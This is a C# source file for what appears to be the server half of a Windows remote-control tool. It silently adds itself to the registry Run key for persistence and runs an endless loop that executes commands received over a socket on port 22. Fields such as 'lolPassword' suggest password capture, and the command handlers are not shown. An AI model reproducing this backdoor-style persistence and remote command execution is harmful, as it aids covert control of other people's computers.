using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ServerUdpRemake
{
    class Program
    {
        
        static private IPAddress localIp = GetLocalIPAddress();

        static private Thread lolThread;
        static private Thread imageThread;

        static public bool exitThread = false;

        static public int counter = 1;

        static public bool passSent = false;

        static public string lolPassword = "";

        //Used to wake the monitor
        [DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        //usedw to turn off the monitor
        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

        //constants for moving the mouse to wake the monitor and turning off the moniotr
        private const int MOUSEEVENTF_MOVE = 0x0001;
        private const int MonitorStateOff = 2;
        static void Main(string[] args)
        {
            SetAsStartupApplication();
            Start();
        }

        private static void Start()
        {
            MessagingSocket messagingSocket = new MessagingSocket(22);
            while (true)
            {
                SocketMessage message = messagingSocket.Receive();
                CommandFactory.get(message.GetMessage()).Apply(messagingSocket);
            }
        }

        private static void SetAsStartupApplication()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("Controlling", Application.ExecutablePath);
        }
    }
}
